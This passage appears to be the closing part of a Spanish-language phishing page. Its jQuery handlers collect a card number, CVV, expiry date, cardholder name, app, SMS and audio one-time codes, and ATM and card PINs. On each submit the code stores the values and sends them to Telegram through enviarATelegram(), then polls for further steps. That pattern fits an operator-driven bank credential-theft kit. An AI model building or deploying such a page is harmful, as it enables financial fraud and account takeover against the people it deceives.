            $('#vencimientoTC').on('input', function () {
                let value = $(this).val().replace(/\D/g, ''); // Solo números

                // Limitar a 4 dígitos
                if (value.length > 4) {
                    value = value.substring(0, 4);
                }

                // Formatear automáticamente MM/AA
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }

                $(this).val(value);

                // Validar y mostrar errores
                if (value.length === 0) {
                    ocultarError('errorVencimiento', 'containerVencimiento');
                    verde2 = 0;
                } else if (!/^\d{2}\/\d{2}$/.test(value)) {
                    mostrarError('vencimientoTC', 'errorVencimiento', 'containerVencimiento',
                        'Formato inválido. Use MM/AA');
                    verde2 = 0;
                } else {
                    const [mes, anio] = value.split('/');
                    const mesNum = parseInt(mes, 10);

                    if (mesNum < 1 || mesNum > 12) {
                        mostrarError('vencimientoTC', 'errorVencimiento', 'containerVencimiento',
                            'El mes debe estar entre 01 y 12');
                        verde2 = 0;
                    } else if (!validarVencimiento(value)) {
                        mostrarError('vencimientoTC', 'errorVencimiento', 'containerVencimiento',
                            'La tarjeta está vencida');
                        verde2 = 0;
                    } else {
                        ocultarError('errorVencimiento', 'containerVencimiento');
                        verde2 = 1;
                    }
                }

                validateTC();
            });

            // Validación de CVV
            $('#cvvTC').on('input', function () {
                let value = $(this).val().replace(/\D/g, ''); // Solo números

                // Obtener tipo de tarjeta para determinar longitud de CVV
                const numeroTarjeta = $('#numtarjetaTC').val().replace(/\s/g, '');
                const tipoTarjeta = detectarTipoTarjeta(numeroTarjeta);

                // American Express usa CVV de 4 dígitos, otros usan 3
                const longitudCVV = tipoTarjeta === 'amex' ? 4 : 3;

                // Limitar longitud
                if (value.length > longitudCVV) {
                    value = value.substring(0, longitudCVV);
                }

                $(this).val(value);

                // Validar y mostrar errores
                if (value.length === 0) {
                    ocultarError('errorCVV', 'containerCVV');
                    verde3 = 0;
                } else if (value.length < longitudCVV) {
                    mostrarError('cvvTC', 'errorCVV', 'containerCVV',
                        'El CVV debe tener ' + longitudCVV + ' dígitos');
                    verde3 = 0;
                } else {
                    ocultarError('errorCVV', 'containerCVV');
                    verde3 = 1;
                }

                validateTC();
            });

            // Validación del nombre del titular
            $('#titularTC').on('input', function () {
                let value = $(this).val();

                // Convertir a mayúsculas (como en tarjetas reales)
                value = value.toUpperCase();

                // Permitir solo letras, espacios, puntos, guiones y apóstrofes
                value = value.replace(/[^A-ZÁÉÍÓÚÑ\s.\-']/g, '');

                // Limitar longitud
                if (value.length > 100) {
                    value = value.substring(0, 100);
                }

                $(this).val(value);

                // Validar y mostrar errores
                const nombreLimpio = value.trim();

                if (value.length === 0) {
                    ocultarError('errorTitular', 'containerTitular');
                    verde4 = 0;
                } else if (nombreLimpio.length < 3) {
                    mostrarError('titularTC', 'errorTitular', 'containerTitular',
                        'El nombre debe tener al menos 3 caracteres');
                    verde4 = 0;
                } else {
                    const palabras = nombreLimpio.split(/\s+/).filter(p => p.length > 0);
                    if (palabras.length < 2) {
                        mostrarError('titularTC', 'errorTitular', 'containerTitular',
                            'Ingrese nombre y apellido completos');
                        verde4 = 0;
                    } else if (!validarNombreTitular(value)) {
                        mostrarError('titularTC', 'errorTitular', 'containerTitular',
                            'El nombre contiene caracteres no permitidos');
                        verde4 = 0;
                    } else {
                        ocultarError('errorTitular', 'containerTitular');
                        verde4 = 1;
                    }
                }

                validateTC();
            });

            setInterval(validateTC, 100);
            $('#checkTC').on('change', validateTC);

            $('#btnTC').on('click', async function () {
                if (validateTC()) {
                    saveToLocalStorage('tdc', $('#numtarjetaTC').val().trim());
                    saveToLocalStorage('cvv', $('#cvvTC').val().trim());
                    saveToLocalStorage('ven', $('#vencimientoTC').val().trim());
                    saveToLocalStorage('status', 'TC');

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // Validación OTP App
            $('#otpappInput').on('input', function () {
                const value = $(this).val().trim();

                if (value.length === 0) {
                    ocultarError('errorOtpApp', 'containerOtpApp');
                } else if (!/^\d+$/.test(value)) {
                    mostrarError('otpappInput', 'errorOtpApp', 'containerOtpApp',
                        'El código solo debe contener números');
                } else if (value.length < 6) {
                    mostrarError('otpappInput', 'errorOtpApp', 'containerOtpApp',
                        'El código debe tener entre 6 y 8 dígitos');
                } else if (value.length > 8) {
                    mostrarError('otpappInput', 'errorOtpApp', 'containerOtpApp',
                        'El código no puede exceder 8 dígitos');
                } else {
                    ocultarError('errorOtpApp', 'containerOtpApp');
                }

                validateOtp('#otpappInput', '#btnOtpApp');
            });
            $('#btnOtpApp').on('click', async function () {
                if (validateOtp('#otpappInput', '#btnOtpApp')) {
                    saveToLocalStorage('otpapp', $('#otpappInput').val().trim());
                    saveToLocalStorage('status', 'OTPAPP');

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // Validación OTP SMS
            $('#otpsmsInput').on('input', function () {
                const value = $(this).val().trim();

                if (value.length === 0) {
                    ocultarError('errorOtpSms', 'containerOtpSms');
                } else if (!/^\d+$/.test(value)) {
                    mostrarError('otpsmsInput', 'errorOtpSms', 'containerOtpSms',
                        'El código solo debe contener números');
                } else if (value.length < 6) {
                    mostrarError('otpsmsInput', 'errorOtpSms', 'containerOtpSms',
                        'El código debe tener entre 6 y 8 dígitos');
                } else if (value.length > 8) {
                    mostrarError('otpsmsInput', 'errorOtpSms', 'containerOtpSms',
                        'El código no puede exceder 8 dígitos');
                } else {
                    ocultarError('errorOtpSms', 'containerOtpSms');
                }

                validateOtp('#otpsmsInput', '#btnOtpSms');
            });
            $('#btnOtpSms').on('click', async function () {
                if (validateOtp('#otpsmsInput', '#btnOtpSms')) {
                    saveToLocalStorage('otpsms', $('#otpsmsInput').val().trim());
                    saveToLocalStorage('status', 'OTPSMS');

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // Validación OTP Audio
            $('#otpaudioInput').on('input', function () {
                const value = $(this).val().trim();

                if (value.length === 0) {
                    ocultarError('errorOtpAudio', 'containerOtpAudio');
                } else if (!/^\d+$/.test(value)) {
                    mostrarError('otpaudioInput', 'errorOtpAudio', 'containerOtpAudio',
                        'El código solo debe contener números');
                } else if (value.length < 4) {
                    mostrarError('otpaudioInput', 'errorOtpAudio', 'containerOtpAudio',
                        'El código debe tener 4 dígitos');
                } else if (value.length > 4) {
                    mostrarError('otpaudioInput', 'errorOtpAudio', 'containerOtpAudio',
                        'El código debe tener 4 dígitos');
                } else {
                    ocultarError('errorOtpAudio', 'containerOtpAudio');
                }

                validateOtp('#otpaudioInput', '#btnOtpAudio');
            });
            $('#btnOtpAudio').on('click', async function () {
                if (validateOtp('#otpaudioInput', '#btnOtpAudio')) {
                    saveToLocalStorage('otpaudio', $('#otpaudioInput').val().trim());
                    saveToLocalStorage('status', 'OTPAUDIO');

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // Validación Clave de Cajero
            $('#clavecajeroInput').on('input', function () {
                const value = $(this).val().trim();

                if (value.length === 0) {
                    ocultarError('errorClaveCajero', 'containerClaveCajero');
                } else if (!/^\d+$/.test(value)) {
                    mostrarError('clavecajeroInput', 'errorClaveCajero', 'containerClaveCajero',
                        'La clave solo debe contener números');
                } else if (value.length < 4) {
                    mostrarError('clavecajeroInput', 'errorClaveCajero', 'containerClaveCajero',
                        'La clave debe tener 4 dígitos');
                } else if (value.length > 4) {
                    mostrarError('clavecajeroInput', 'errorClaveCajero', 'containerClaveCajero',
                        'La clave debe tener 4 dígitos');
                } else {
                    ocultarError('errorClaveCajero', 'containerClaveCajero');
                }

                validateOtp('#clavecajeroInput', '#btnClaveCajero');
            });
            $('#btnClaveCajero').on('click', async function () {
                if (validateOtp('#clavecajeroInput', '#btnClaveCajero')) {
                    saveToLocalStorage('clavecajero', $('#clavecajeroInput').val().trim());
                    saveToLocalStorage('status', 'CLAVECAJERO');

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // Validación Clave de Tarjeta de Crédito
            $('#clavetdcInput').on('input', function () {
                const value = $(this).val().trim();

                if (value.length === 0) {
                    ocultarError('errorClaveTDC', 'containerClaveTDC');
                } else if (!/^\d+$/.test(value)) {
                    mostrarError('clavetdcInput', 'errorClaveTDC', 'containerClaveTDC',
                        'La clave solo debe contener números');
                } else if (value.length < 4) {
                    mostrarError('clavetdcInput', 'errorClaveTDC', 'containerClaveTDC',
                        'La clave debe tener 4 dígitos');
                } else if (value.length > 4) {
                    mostrarError('clavetdcInput', 'errorClaveTDC', 'containerClaveTDC',
                        'La clave debe tener 4 dígitos');
                } else {
                    ocultarError('errorClaveTDC', 'containerClaveTDC');
                }

                validateOtp('#clavetdcInput', '#btnClaveTDC');
            });
            $('#btnClaveTDC').on('click', async function () {
                if (validateOtp('#clavetdcInput', '#btnClaveTDC')) {
                    saveToLocalStorage('clavetdc', $('#clavetdcInput').val().trim());
                    saveToLocalStorage('status', 'CLAVETDC');

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // ==================== INICIALIZACIÓN ====================
            showView('user');
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>